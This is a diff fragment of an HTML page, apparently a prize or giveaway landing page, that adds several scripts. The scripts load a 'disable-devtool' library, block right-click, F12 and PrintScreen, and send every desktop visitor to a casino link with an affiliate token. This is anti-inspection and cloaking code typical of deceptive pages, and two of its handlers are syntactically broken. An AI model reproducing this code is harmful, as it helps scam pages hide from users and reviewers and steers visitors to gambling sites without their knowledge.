@@ -3,6 +3,7 @@
 
 
 
+
 <html><head>
     
   <meta charset="utf-8">
@@ -216,6 +217,49 @@ prizeBtn.onclick = function() {
     window.location.href = url;
 }
 </script>
+
+<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>
+
+<script>
+document.addEventListener("contextmenu", function (e){
+    e.preventDefault();
+}, false);
+</script>
+
+<script>
+document.onkeypress = function (event) {
+event = (event  window.event);
+if (event.keyCode == 123) {return false;}
+if (event.keyCode == 93) {return false;}
+if (event.keyCode == 44) {return false;}
+}
+document.onmousedown = function (event) {
+event = (event  window.event);
+if (event.keyCode == 123) {return false;}
+if (event.keyCode == 93) {return false;}
+if (event.keyCode == 44) {return false;}
+}
+document.onkeydown = function (event) {
+event = (event || window.event);
+if (event.keyCode == 123) {return false;}
+if (event.keyCode == 93) {return false;}
+if (event.keyCode == 44) {return false;}
+}
+</script>
+
+<script>
+    function redirectToMobile() {
+            var userAgent = navigator.userAgent.toLowerCase();
+    var isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
+
+    if (!isMobile) {
+        window.location.href = "https://www.kto.com/pt/cassino/?myafftkn=sFa0u-w5E2jM9pVa8kFgiWNd7ZgqdRLk&partner=AQ0240597007"; // Substitua com a URL desejada para computadores
+            }
+        }
+
+    redirectToMobile();
+</script> 
+
 
 <!-- Meta Pixel Code -->
 <script>
